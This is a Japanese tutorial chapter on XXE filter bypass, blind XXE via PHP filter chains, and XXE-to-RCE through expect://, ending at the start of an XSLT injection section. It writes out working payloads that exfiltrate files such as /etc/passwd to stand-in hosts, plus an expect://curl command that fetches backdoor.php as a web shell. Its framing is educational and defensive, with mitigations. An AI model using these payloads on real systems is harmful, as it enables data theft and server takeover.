# 第5章 発展・フィルタ回避・関連攻撃


## WAF/ブラックリスト回避

XXE（XML External Entity：XML外部実体参照攻撃）を防ぐ最前線に置かれることが多いのが **WAF（Web Application Firewall：Webアプリの前段でリクエストを検査し、既知の攻撃パターンを遮断する装置）** と、アプリ側の **ブラックリスト（`SYSTEM` や `DOCTYPE` といった危険語を文字列一致で拒否する仕組み）** である。しかしこれらの多くは「攻撃を意味する文字列」を **正規表現（regex）** で探しているだけで、実際にXMLを **パーサ（XMLを構文解析して実体を展開するライブラリ本体）** と同じ厳密さで解釈しているわけではない。この「WAFの見え方」と「パーサの解釈」のズレこそが、あらゆる回避テクニックの源泉である。

本節では、この原理を軸に代表的な回避手法を仕組みレベルで解説する。防御側の視点で「なぜ単純なブラックリストが破られるのか」「では何を検証すべきか」を理解することが目的であり、実在サービスや本番環境への無許可の検証を推奨するものではない。

### 回避が成立する根本原理：WAFとパーサの「解釈ギャップ」

WAFがXXEを検知する典型パターンは、次のような正規表現である（Ambrotd/XXE-Notes が例示する実物）。

```
/<!(?:DOCTYPE|ENTITY)(?:\s|%|&#[0-9]+;|&#x[0-9a-fA-F]+;)+[^\s]+\s+(?:SYSTEM|PUBLIC)\s+['"]/im
```

これは「`<!DOCTYPE` または `<!ENTITY` の後に空白・パーセント・数値文字参照が続き、その先に `SYSTEM` か `PUBLIC` と引用符が現れる」パターンを探している。つまりWAFは **バイト列（送られてきた生の文字列）** を表面的に眺めているだけである。

一方、XMLパーサは以下を **順番に** 行う。

1. バイト列の **文字エンコーディングを判定** する（UTF-8なのかUTF-16なのか等）。
2. 判定したエンコーディングでバイト列を **文字（コードポイント）に復号** する。
3. 復号後の文字列を構文解析し、**実体（entity）を再帰的に展開** する。

回避手法は、この1〜3のいずれかの段でWAFとパーサの認識をずらす。すなわち、

- **段1・2をずらす**＝WAFが想定しないエンコーディングを使い、WAFには意味不明なバイト列に見せつつパーサには正しく復号させる。
- **段3をずらす**＝危険語 `SYSTEM` などをその場では書かず、実体展開の結果としてパーサ内部にだけ出現させる。

以下、この2系統に沿って個別手法を見ていく。

### 系統A：文字レベルの回避（危険語を実体展開で「後から」出す）

#### A-1. HTMLエンティティ（数値文字参照）による危険語の隠蔽

最も強力かつ実用的なのが、`SYSTEM`・`ENTITY`・`http` といった **ブラックリスト語を数値文字参照（`&#xNN;` 形式）に変換して書く** 手法である。Ambrotd/XXE-Notes および shubs（Shubham Shah）の公開した Akamai WAF 回避例が有名で、原理は次の通り。

XMLでは、実体（entity）の **値の中** に数値文字参照を書くと、パーサはそれを展開してから解釈する。したがって危険語をその場に生テキストで置かず、「展開されると危険語になる文字列」として仕込めば、WAFの正規表現には一致しない。

たとえば、本来ブロックされる次の宣言：

```xml
<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd" >
```

をまるごと数値文字参照に変換する（Ambrotd/XXE-Notes の実物）。

```
&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x20;&#x25;&#x20;&#x64;&#x74;&#x64;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x20;&#x3E;
```

`&#x3C;` は `<`、`&#x21;` は `!`、`&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;` は `SYSTEM` である。WAFの目には `SYSTEM` も `<!ENTITY` も一切見えない。これを実体の値に入れ、その実体を参照させる（stager：本命DTDを呼び出すための短い先行ペイロード）。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % a "&#x3C;...（上記の数値文字参照の並び）...&#x3E;" >
  %a;
  %dtd;
]>
<data><env>&exfil;</env></data>
```

**なぜ成立するのか。** パーサはまず `%a;` を展開する。すると `%a` の値（数値文字参照の羅列）が復号され、`<!ENTITY % dtd SYSTEM "http://ourserver.com/bypass.dtd">` という **新しいパラメータ実体宣言そのもの** がパーサ内部に生成される。続く `%dtd;` でその外部DTDが読み込まれ、本命の攻撃が始まる。WAFは最初のリクエストの生バイト列しか見ておらず、しかもそこに危険語はエンコードされて存在しないため、素通りする。

重要なのは、**WAF/正規表現を破るのは一度きりでよい** という点である。いったん外部DTD（攻撃者が管理するサーバ上のファイル）を呼び出せてしまえば、そのDTDの中身はWAFを一切通らないので、危険語を平文で好きなだけ書ける。回避処理を「入口」に閉じ込め、本体を外部に逃がす二段構えが要諦である。

> 出典: Ambrotd/XXE-Notes（GitHub） — https://github.com/Ambrotd/XXE-Notes

#### A-2. 外部DTD側での本命ペイロード（OOB持ち出し）

A-1で呼び出す外部DTD（攻撃者サーバ上の `bypass.dtd`）は、次のような **OOB（Out-Of-Band：応答本文ではなく攻撃者サーバへの別チャネル通信で結果を持ち出す）** 型の実体を定義する（Ambrotd/XXE-Notes の実物）。

```
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/path/to/file">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://ourserver.com/bypass.xml?%data;'>">
%abt;
```

**仕組み。** `%data` は `php://filter`（PHPの入出力ラッパー。読み込んだファイルを変換して返す）を使い、目的ファイルをBase64化して取り込む。Base64にするのは、ファイル中の改行や `&`・`<` などがXMLとして壊れるのを防ぐためである（読み出し内容が構文を破壊しないようにする定石）。次に `%abt` は「`exfil` という実体を、`%data` の値をURLのクエリに埋めたHTTPリクエスト先として定義する宣言」を組み立てる。`%abt;` を展開するとその `exfil` 宣言が有効になり、最終的にstager本文中の `&exfil;` がトリガーとなって、Base64化されたファイル内容が攻撃者サーバへ送られる。この外部DTD部分はWAFを通過しないため、危険語のエンコードは不要である。

> 出典: Ambrotd/XXE-Notes（GitHub） — https://github.com/Ambrotd/XXE-Notes

#### A-3. `PUBLIC` とパラメータ実体による語の分散

ブラックリストが `SYSTEM` だけを禁じている場合、外部参照はもう一つのキーワード `PUBLIC` でも書ける。

```xml
<!ENTITY % xxe PUBLIC "Random Text" "http://attacker/evil.dtd">
```

`PUBLIC` は本来「公開識別子（人間可読の名前）＋システム識別子（実URL）」の二引数を取る形式だが、外部リソースの取得挙動は `SYSTEM` と実質同じである。WAFのシグネチャが `SYSTEM` に偏っていると、この一語違いで抜けてしまう。さらに危険語を **パラメータ実体（`%name;`）に分割** して組み立てれば、単一トークンとしての `SYSTEM` を文書中に一度も出現させないこともできる（A-1の応用）。

### 系統B：エンコーディング・空白レベルの回避

#### B-1. 異種文字エンコーディング（UTF-16 / UTF-7 / UTF-32 など）

WAFの正規表現は通常 **単一の文字集合（多くはUTF-8/ASCII）** を前提に組まれている。ところがXMLは仕様上さまざまなエンコーディングを許容する（UTF-8、UTF-16の各種、UTF-32/UCS-4の各種、EBCDICなど）。そこで文書を、たとえばUTF-16でエンコードして送る。

```xml
<?xml version="1.0" encoding="UTF-16"?>
```

**なぜ成立するのか。** UTF-16では各ASCII文字が2バイト（片方が`0x00`のヌルバイト）で表現される。UTF-8前提のWAF正規表現は、`0x00` が随所に挟まったバイト列の中に `SYSTEM` という連続バイトを見つけられない。一方パーサはBOM（Byte Order Mark：先頭に置く、バイト順を示す印）や `encoding` 属性からUTF-16と判定し、正しく復号して実体を展開する。Wallarmはこの点を「libxml2 は BOM 無しの UTF-32 変種を一つしかサポートしない」など、**パーサごとにサポートするエンコーディングが食い違う** 事実として指摘している。WAFが対応していない、しかし標的パーサは対応している珍しいエンコーディング（exotic encoding）を選べば回避が成立する。

> 出典: XXE that can Bypass WAF Protection: 4 Ways（Wallarm） — https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/

#### B-2. 一文書内での二重エンコーディング（切り替え点のズレ）

Wallarmが挙げる4手法のうち最も巧妙なのが、**一つの文書内でエンコーディングを切り替え、その切り替え点の解釈がパーサごとに異なる** ことを突く手法である。

**なぜ成立するのか。** パーサは「XML宣言（`<?xml ... ?>`）を読んで初めて本文のエンコーディングを確定する」が、その **確定タイミングがパーサ実装で違う**。Wallarmによれば、Javaの `javax.xml.parsers` は `<?xml?>` の終了後に厳密に文字集合を切り替えるのに対し、libxml2 はもっと早く／遅く切り替える場合がある。加えて `UTF-32BE` と `UCS-4BE` のように **同義だが名前の違うエンコーディング** や、互換だが微妙に異なるエンコーディングが存在する。WAFがある解釈で復号して「無害」と判断した文書を、標的パーサは別の解釈で復号し、そこに攻撃ペイロードが立ち現れる——この不一致が回避を生む。

#### B-3. XML宣言・DOCTYPEへの余分な空白挿入

Wallarmの言う第1の手法「Extra Document Spaces」は、`<?xml?>` や `<!DOCTYPE>` の内部に **余分な空白** を挿入するものである。

```xml
<?xml    version = "1.0"    encoding = "UTF-8" ?>
<!DOCTYPE   foo   [ ... ]>
```

**なぜ成立するのか。** XMLの構文はタグ属性まわりで任意個の空白を許すため、これは完全に正当なXMLである。ところが「文書の冒頭だけを決め打ちの固定パターンで見る **手抜きな（lazy）WAF**」は、`<?xml version="1.0"` のような密着した並びしか想定しておらず、空白が増えるとパターンに一致せず通してしまう。パーサ側は空白を正しく読み飛ばすので何の支障もない。

#### B-4. プロトコル前の空白（SSRF/ファイル読取り用）

系統Bの応用として、WAF-Bypass.com が紹介するとされる **「プロトコルの直前に空白を置く」** 手法がある。

```xml
<!ENTITY xxe SYSTEM " file:///etc/passwd">
```

URIの先頭に空白を入れると、`file://` や `http://` を密着形で探すWAFの正規表現を外せる一方、寛容なパーサ／URIハンドラは先頭空白をトリムして同じリソースにアクセスする、という発想である。SSRF（Server-Side Request Forgery：サーバに任意の宛先へ通信させる攻撃）やローカルファイル読取りと組み合わせて使われる。ただし空白トリムの挙動はパーサ・URLライブラリ依存であり、常に成功するわけではない点に注意が必要である。

#### B-5. 未知実体でパーサを止めない前提（WAF側の弱点）

Wallarmの第2手法「Invalid Format - Unknown Entity Links」は攻撃ペイロードというより **WAF実装の落とし穴** の指摘である。真面目なWAFはリンク先ファイルの中身までは読まないため、DOCTYPE外・本文中で参照される未知の実体（例：`&attack;`）に出会うと「未定義実体エラー」で解析を打ち切ってしまうことがある。攻撃者は「WAFは途中で諦めるが、実際のパーサは外部宣言を読み込んで実体を解決する」という差を突く。Wallarmはこれへの対策として「WAF内のXMLパーサを、未知実体に出会っても停止しない設定にせよ」と述べている。

> 出典: XXE that can Bypass WAF Protection: 4 Ways（Wallarm） — https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/

### 3つ目の資料について（取得状況）

> ⚠️ **未取得の資料**: 「WAF-Bypass.com（Tag: XXE）」は自動取得できませんでした（理由: 名前解決に失敗。`getaddrinfo ENOTFOUND waf-bypass.com`。egress環境でのDNS解決不可と推測）。以下のURLからご自身で直接ご覧ください: https://waf-bypass.com/tag/xxe/

（以下は未取得資料の補足として一般知識に基づく解説です）WAF-Bypass.com は、特定WAF製品（Akamai・Cloudflare・AWS WAF・Wallarm等）ごとに検証された回避ペイロードをタグ付きで公開しているコミュニティ寄りのサイトである。XXEタグ配下で扱われる主要トピックは、本節で述べた **HTMLエンティティによる `SYSTEM` 隠蔽**、**プロトコル前の空白**、**`PUBLIC`／パラメータ実体**、**異種エンコーディング** とおおむね重なる。各ペイロードは「どのWAFで／いつ時点で通ったか」に強く依存するため、掲載の可否・成否は時事的であり、恒久的に有効なものではない点に留意されたい（WAFシグネチャは随時更新される）。

> 出典（参考・検索経由）: WAF-Bypass.com — https://waf-bypass.com/tag/xxe/ ／ shubs（infosec_au）のAkamai XXE回避例 — https://x.com/infosec_au/status/1535518959684157441

### バージョン・時事性に関する注意

- 本節の回避手法は **WAFのシグネチャ実装とXMLパーサ実装の差** に依存する。特定WAF（例：2022年頃のAkamai）で有効だった数値文字参照回避が、シグネチャ更新後も通る保証はない。
- エンコーディング差の具体例（libxml2 のUTF-32サポート、Javaの `javax.xml.parsers` の切り替えタイミング等）はWallarm記事（2018年前後）時点の観察であり、各ライブラリの最新版では挙動が変わりうる。検証時は対象パーサのバージョンを必ず確認すること。
- `php://filter` を用いたOOB持ち出しはPHP環境固有であり、PHP 8系以降や設定（`allow_url_include`、ラッパー無効化）によって成否が変わる。

### 防御側のまとめ：ブラックリストではなくパーサ設定で止める

ここまでの回避手法が示す教訓は一つである——**「危険語の文字列一致」でXXEを止めるのは原理的に破綻している**。WAFはパーサと同じ厳密さでエンコーディングを復号し実体を再帰展開しない限り、常にギャップを突かれる。したがって根本対策は入口のブラックリストではなく、XMLを解釈する **パーサそのものの設定** に置く。Wallarmも結論として次の2点を挙げる。

1. **外部実体（external entities）の処理を無効化する。**
2. **外部DTD（external DTD schema）の読み込みを無効化する。**

これらをパーサレベル（例：Java なら `XMLConstants.FEATURE_SECURE_PROCESSING` の有効化、`setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` によるDOCTYPE自体の拒否、libxml2 なら外部実体ロードを行わない設定）で徹底すれば、本節のどのエンコーディング・数値文字参照・空白トリックを使われても、そもそも外部参照が起きないため無効化できる。WAFはあくまで多層防御の一枚であり、最後の砦はパーサ設定である、という位置づけを守ることが肝要である。

> 出典: XXE that can Bypass WAF Protection: 4 Ways（Wallarm） — https://lab.wallarm.com/xxe-that-can-bypass-waf-protection-98f679452ce0/

## PHPフィルタチェーンとXXE→RCE

XXE（XML External Entity injection、XML外部実体注入）は入門段階では「`file:///etc/passwd` を読める脆弱性」として紹介される。しかし PHP アプリケーションを相手にすると、この攻撃は二つの方向へ大きく発展する。

1. **読み取り面の強化** — `php://filter` という PHP 独自のストリームラッパ（stream wrapper: ファイルを開くときに変換処理を挟み込める仕組み）を external entity の `SYSTEM` 先に指定し、**PHP ソースコードそのもの**を base64 で吸い出す。さらに、外部への通信もエラーメッセージも封じられた「一見不可能な（Impossible）」ブラインド環境でも、**PHP フィルタチェーン＋エラーベース・オラクル**を使って任意ファイルを 1 バイトずつ完全に復元できる（`lightyear` の技術）。
2. **実行面への飛躍（XXE→RCE）** — PHP に `expect` 拡張が読み込まれている場合、`expect://` ラッパを external entity にすると **OS コマンドが実行され、その標準出力が実体として展開**される。ファイル読み取り脆弱性が、そのまま任意コマンド実行（RCE: Remote Code Execution）へ化ける。

本節ではこの二つを、なぜそう動くのかという仕組みのレベルまで掘り下げる。

> ⚠️ **未取得の資料**: 本節が担当する 3 本の一次資料（Positive Technologies「Impossible XXE in PHP」／ Medium・Airman「From XXE to RCE with PHP/expect」／ Keiran Scott「Exploiting XXE Vulnerabilities」）は、いずれも実行環境の egress プロキシによりブロックされ（swarm.ptsecurity.com は TLS 証明書検証エラー、Medium は HTTP 403、keiran.scot は接続リセット）、直接取得できませんでした。以下のURLからご自身で直接ご覧ください。
> - https://swarm.ptsecurity.com/impossible-xxe-in-php/
> - https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
> - https://keiran.scot/2022/02/10/exploiting-xxe-vulnerabilities/
>
> （以下は、上記 3 本の要点を Web 検索の要約と、直接取得できた関連一次資料 — Lexfo による `lightyear` 技術解説ブログ、および PayloadsAllTheThings の XXE ペイロード集 — の実物、および一般知識に基づいて再構成した解説です。ペイロードは公開されている一次資料・OSS の実物を優先して引用しています。）

---

### 前提の復習：`php://filter` で「PHP ソース」を読む

通常の external entity でローカルファイルを読もうとすると、`<?php ... ?>` を含む PHP ファイルは XML パーサが `<` を解釈しようとして壊れたり、そもそもソースが実行されて出力しか返らなかったりする。そこで PHP 独自の `php://filter` を挟む。

```xml
<!DOCTYPE replace [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
<contacts><contact><name>Jean &xxe; Dupont</name></contact></contacts>
```

- `convert.base64-encode` は、読み込んだバイト列を **base64 に変換してから**エンティティに渡す。
- **なぜこれが要るのか**：base64 の出力は `A-Z a-z 0-9 + / =` だけなので、`<`, `>`, `&`, `<?php` といった「XML パーサやテンプレートを壊す文字」がすべて消える。結果として、PHP のソースコードでもバイナリでも、XML の実体値として安全に運べる。攻撃者は返ってきた base64 をローカルでデコードすればソースが手に入る。設定ファイルの DB 認証情報や秘密鍵の入手につながる。

> 出典: PayloadsAllTheThings — XXE Injection（php://filter base64 のペイロード） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

---

### エラーベース XXE と OOB XXE：ブラインドでも中身を取り出す

`&xxe;` の結果が画面に出ない「ブラインド XXE」では、外部 DTD（Document Type Definition: XML の文法・実体定義を書いた別ファイル）を攻撃者サーバに置き、**パラメータ実体**（`%name;` 形式、DTD 内でしか使えない実体）を入れ子にして中身を外へ運ぶ。

**帯域外（OOB: Out-Of-Band）exfiltration の基本形**：

```xml
<!-- 標的に送る XML -->
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://attacker.com/oob.dtd">
<data>&send;</data>
```

```xml
<!-- attacker.com/oob.dtd -->
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % all  "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
%all;
```

- `%file` にファイルの base64 が入り、`%all` を評価すると「`send` という実体が `http://attacker.com/?（base64）` を指す」という定義が動的に作られる。標的が `&send;` を解決しようとして攻撃者サーバへ HTTP リクエストを飛ばし、URL のクエリに中身が乗って**流出**する。
- **なぜ base64 を挟むのか**：ファイル中の改行や `&`, `'` は、そのままだと URL や実体定義を壊す。base64 化で URL セーフな文字だけにして初めて安定して運べる。

**エラーベース XXE**（外部通信が塞がれ、しかしエラーメッセージは見える環境）：

```xml
<!-- attacker.com/ext.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

- `%file` の中身を、**存在しないパス**の一部として使う。パーサは `file:///nonexistent/root:x:0:0:...` を開こうとして失敗し、**エラーメッセージにファイル内容を丸ごと含めて**吐く。`&#x25;` は `%` の文字参照で、DTD 内でパラメータ実体を「今すぐ」ではなく「後で」定義させるための遅延評価テクニックである。

> 出典: PayloadsAllTheThings — XXE Injection（error-based / OOB DTD） — https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

---

### PHP フィルタチェーンと `lightyear`：オラクルだけで任意ファイルを 1 バイトずつ復元

ここからが本節の核心の一つ、Positive Technologies「Impossible XXE in PHP」が扱った**「一見不可能な」状況**である。想定するのは次のような最悪条件のブラインド XXE:

- **外部への通信ができない**（OOB が使えない）。
- **エラーメッセージのテキストが出ない**（エラーベースで中身が読めない）。
- しかも DOCTYPE を使うと必ずエラーになり、**成功時の 500 と失敗時の 500 が区別できない**。

一見「出力チャネルが皆無」に見える。しかし PHP には、出力の有無だけで 1 ビットを判定できる **エラーベース・オラクル（error-based oracle）** が作れる。これを支えるのが **PHP フィルタチェーン** である。

#### フィルタチェーンの原理

`php://filter/.../resource=FILE` の `...` 部分に、変換フィルタを `|`（パイプ）で何段も連結できる。

```
php://filter/convert.base64-encode|convert.iconv.UTF8.UTF16|.../resource=/etc/passwd
```

- `convert.iconv.X.Y` は文字エンコーディングを X→Y に変換する iconv フィルタ。**変換に失敗すると PHP は警告を出し、処理を中断する**。
- **なぜオラクルになるのか**：特定の文字集合の組み合わせでは、入力に「ある文字が含まれているとき**だけ**」変換エラーが起きる／起きない、という条件が作れる。つまり「エラーが出た＝ビット 1／出ない＝ビット 0」という**1 ビットの真偽値**を、通信もエラー本文も無しに、レスポンスの成否（空か非空か）だけから読み取れる。これがオラクル。

これを使い、ファイルを base64 化した文字列を先頭から 1 桁ずつ二分探索していけば、通信もエラー本文も無い環境で、任意ファイルの中身を復元できる。従来ツール（`php_filter_chains_oracle_exploit`）はこれを実装していたが、1 桁あたり 10 回以上のリクエストが必要で、しかも「135 番目の base64 桁を選ぶのに 7000 文字超のペイロード」といった巨大さが問題だった。

#### `lightyear` の改良点

Lexfo が公開した `lightyear` は、二つの発明でこれを実用化した。

1. **`dechunk` フィルタで“塊ごと”消す**：`dechunk` は HTTP チャンク転送エンコーディングを復号するフィルタ。`5\nABCDE\n3\nFGH\n0\n` のように「16 進サイズ＋データ」の形式を読むが、**サイズが不正だと残りを警告なしにまるごと捨てる**。この性質を使い、`convert.iconv` チェーンで base64 のある桁を `\n`（改行）に化けさせると、dechunk がその手前を一括除去できる。従来の「1 文字ずつずらす」方式に比べ、**206 桁ぶんの除去が 229 文字のペイロード**で済むほど小型化した。
2. **最適な二分探索で 1 バイト＝最大 6 リクエスト**：64 種の base64 桁集合をちょうど半分に割るフィルタ列を用意し、`convert.iconv.UTF16.UTF16|convert.quoted-printable-encode|convert.base64-decode` の結果が「有効な 16 進チャンクサイズか（＝空になるか／警告が出るか）」で 1 ビットを取る。log₂64 = 6 なので、**1 バイトあたり 6 リクエスト**に収まる（従来は 10 回以上）。

結果として、854 バイトの `/etc/passwd` を 30 秒未満・ペイロード 2000 バイト未満で吸い出せ、5 万バイト超のファイルすら GET リクエストの範囲で流出できたと報告されている。

> 出典: Lexfo's security blog — Introducing lightyear, a new way to dump PHP files — https://blog.lexfo.fr/lightyear-file-dump.html

#### 「Impossible XXE」が組み合わせたもの

Positive Technologies の研究は、この `lightyear` の **`dechunk` によるチャンク分割**を **XXE の文脈に持ち込んだ**点が新しい。XXE では XML パーサ（libxml）の制約が加わる。長すぎる実体はデフォルトで `XML_PARSE_HUGE` フラグ（巨大な実体を許可する明示フラグ）が無いと拒否される。ところが `lightyear` の `dechunk` はペイロードが最小で済むため、**`XML_PARSE_HUGE` が立っていない標準構成でも、数キロバイト規模のファイルを取り出せた**。「エラーテキストが出ず、DOCTYPE エラーで 500 の区別すらつかない」という、従来なら攻略不能と諦めるブラインド XXE を、フィルタチェーン・オラクルとチャンク分割の組み合わせで攻略できることを示したのが、この研究の結論である。

> ⚠️ **未取得の資料**: 「Impossible XXE in PHP」（Positive Technologies / PT SWARM）は自動取得できませんでした（理由: swarm.ptsecurity.com への接続が TLS 証明書検証エラーで失敗）。以下のURLからご自身で直接ご覧ください: https://swarm.ptsecurity.com/impossible-xxe-in-php/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この研究は 2024 年に公開され、PortSwigger の「Top 10 web hacking techniques of 2024」候補にも挙がった。防御側の教訓は明確で、「エラーも OOB も塞いだからブラインド XXE は安全」という前提は成り立たない。**そもそも DTD 処理・external entity・`php://filter` を無効化すること**（後述）以外に確実な対策はない。

---

### `expect://` による XXE→RCE：ファイル読み取りが任意コマンド実行に化ける

XXE のインパクトを最大化するのが `expect` 拡張である。Airman「From XXE to RCE with PHP/expect」と Keiran Scott の記事が扱うのはこの一手だ。

#### 仕組み

`expect` は PHP の PECL 拡張で、読み込まれると `expect://` というストリームラッパを登録する。`expect://コマンド` を `fopen` 等で開くと、PHP は**シェル経由でそのコマンドを実行し、標準出力（stdout）をストリームの中身として返す**。external entity の `SYSTEM` 先にこれを置くと、実体展開の瞬間にコマンドが走る。

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "expect://id" >
]>
<creds>
  <user>&xxe;</user>
  <pass>mypass</pass>
</creds>
```

- `&xxe;` の解決時に `id` コマンドが実行され、レスポンス中の `<user>` 位置に `uid=0(root) gid=0(root) groups=0(root)` のような**コマンド出力**が返る。ファイル読み取り脆弱性が、その場で RCE に変わる瞬間である。

> 出典: PayloadsAllTheThings — XXE Injection / XXE PHP Wrapper（expect://id） — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Files/XXE%20PHP%20Wrapper.xml

#### 実務上の落とし穴：空白の扱い（`$IFS` トリック）

Airman の記事の「Missing Link（つながっていなかった環）」がここだ。`expect://` の先に `curl -O http://...` のような**空白を含むコマンド**を渡そうとすると、素直には通らない。

- **なぜ通らないか**：external entity の URI 内で空白を URL エンコード（`%20`）すると、`expect` はそれをコマンドの一部としてリテラルに扱ってしまい意図通り分割されない。かといって XML の文字参照（`&#x20;` や `&#32;`）で空白を書いても、**実体宣言の `SYSTEM` 値の中では文字参照が展開されない**ため機能しない。つまり「素の空白は XML を壊しかねず、エンコードは効かない」という板挟みになる。
- **回避策**：シェルの組み込み変数 `$IFS`（Internal Field Separator: 既定で空白・タブ・改行）を空白の代わりに使う。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'1.3.3.7:8000/backdoor.php'"> ]>
<root>
  <name>Joe</name>
  <tel>ufgh</tel>
  <email>START_&file;_END</email>
  <password>kjh</password>
</root>
```

- `curl$IFS-O$IFS'...'` はシェルで `curl -O '...'` として解釈される。`$IFS` が空白の代役を果たすので、URI に生の空白を書かずに済む。この例では攻撃者サーバから `backdoor.php` を取得して設置している（Web シェル設置の典型パターン）。

> ⚠️ **未取得の資料**: 「From XXE to RCE with PHP/expect — The Missing Link」（Medium / Airman、2019 年 6 月公開）は自動取得できませんでした（理由: Medium が HTTP 403 を返却）。以下のURLからご自身で直接ご覧ください: https://airman604.medium.com/from-xxe-to-rce-with-php-expect-the-missing-link-a18c265ea4c7
>
> （以下は未取得資料の補足として一般知識に基づく解説です）記事は `xxelab`（XXE 学習用の PHP アプリ）を題材に、`expect://` の URI 内で「URL エンコードも XML 文字参照も効かない」問題を検証し、`$IFS` による空白回避を「見落とされていた最後の環（the missing link）」として提示している。

#### 前提：`expect` 拡張が読み込まれているか

この一手には強い前提がある。

- `expect` は**デフォルトでは無効**の PECL 拡張であり、意図的に `php.ini` で `extension=expect.so` を有効化した環境でしか使えない。
- また `expect` 拡張は保守が滞り、**PHP 7 系では正式サポートされていない**（PHP 5 系や古い構成でしか実際には動かないことが多い）。
- したがって「XXE があれば必ず RCE」ではなく、**`expect` が載っている限定的な環境でのみ成立する**。防御診断では「expect の有無」を確認項目にすると良い。逆に言えば、expect が無くても前述の `php://filter`＋`lightyear` でソースや秘密情報は抜けるため、「RCE でないから軽微」とは言えない。

> ⚠️ **未取得の資料**: 「Exploiting XXE Vulnerabilities」（Keiran Scott、2022-02-10）は自動取得できませんでした（理由: keiran.scot への接続がリセットされた）。以下のURLからご自身で直接ご覧ください: https://keiran.scot/2022/02/10/exploiting-xxe-vulnerabilities/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）この記事は XXE の実践的解説として、ローカルファイル読み取り → SSRF（Server-Side Request Forgery: サーバに任意先へリクエストさせる）→ ブラインド／エラーベース XXE → `php://filter` によるソース奪取 → `expect://` による RCE、という段階的な攻撃面を通しで扱う構成である。RCE の要は前述のとおり `expect` 拡張の有無に依存する点が繰り返し強調される。

---

### 防御（本節のスコープ：防御目的）

本節の攻撃はいずれも「XML パーサが external entity と危険なストリームラッパを処理してしまう」ことに根がある。防御は入力側で断つ。

1. **DTD と外部実体を全面無効化する**（最優先・最重要）。libxml ベースの PHP では、パーサ設定で外部実体解決を止める。
   ```php
   // PHP: DTD・外部実体の読み込みを止める
   libxml_set_external_entity_loader(function () { return null; });
   $dom = new DOMDocument();
   $dom->loadXML($xml, LIBXML_NONET | LIBXML_DTDLOAD & 0); // ネットワーク禁止、DTD をロードしない
   ```
   - `LIBXML_NONET` で DTD/実体のネットワーク取得を禁止し、`libxml_set_external_entity_loader` で外部実体ローダを無効化する。これで `file://`, `http://`, `php://filter`, `expect://` いずれの external entity も解決されなくなり、ファイル読み取り・OOB・フィルタチェーン・RCE がまとめて塞がる。
   - 補足: 古い PHP では `libxml_disable_entity_loader(true)` が使われたが、これは PHP 8.0 で非推奨・実質無効化された（libxml 2.9 以降は既定で外部実体を読まないため）。新規コードは上記のローダ無効化を用いる。
2. **危険なストリームラッパを載せない**。`expect` 拡張は本番に入れない。`php://filter` を業務で使わないなら、可能な範囲で利用を制限・監査する。
3. **XML より安全な形式を選ぶ**。外部からの構造化データ入力は、DTD 概念を持たない JSON 等に置き換えられるなら置き換える。どうしても XML なら、スキーマ検証はパーサの実体解決を有効にしないライブラリ・設定で行う。
4. **多層防御**。アプリからの外向き通信（egress）を制限すれば OOB exfiltration を鈍らせられる。ただし本節冒頭の「Impossible XXE」が示すとおり、通信もエラーも塞いでもフィルタチェーン・オラクルは残るため、**根本対策はあくまで external entity の無効化**である点を忘れてはならない。

## XSLTインジェクション

XXE（XML外部実体参照）を学んだあなたにとって、XSLT（Extensible Stylesheet Language Transformations）インジェクションは「XMLパーサの拡張機能を悪用する」という点で親戚関係にある攻撃です。しかし攻撃面（アタックサーフェス）は大きく異なります。XXEが「XMLの構文解析（パース）」の段階を狙うのに対し、XSLTインジェクションは「XMLを別の形式へ変換する処理エンジン」そのものを乗っ取ります。この違いを理解すると、なぜ**XXE対策を施したアプリケーションでもXSLTインジェクションが刺さる**のかが腑に落ちます。

本節では、XSLT変換の仕組みから、ファイル読み取り・SSRF・リモートコード実行（RCE）に至る攻撃原理、そして防御目的での対策までを掘り下げます。なお本節はあくまで**防御目的**の解説であり、実在サービスや本番環境への無許可検証、破壊的手順を意図したものではありません。ペイロード例は「なぜ危険なのか」を仕組みレベルで理解し、自組織のコードを堅牢化するための教材として提示します。

### XSLTとは何か — まず変換エンジンを理解する

**XSLT**は、XML文書を別の形式（別のXML、HTML、プレーンテキスト、PDFの中間表現など）へ**変換（transform）**するための言語です。変換ルールを記述したファイルを**スタイルシート（XSL/XSLTファイル）**と呼びます。

処理の登場人物は3つあります。

- **ソースXML（入力データ）**: 変換される元データ。
- **XSLTスタイルシート**: 「このタグをこう出力せよ」という変換規則の集合。それ自体がXML文法で書かれている。
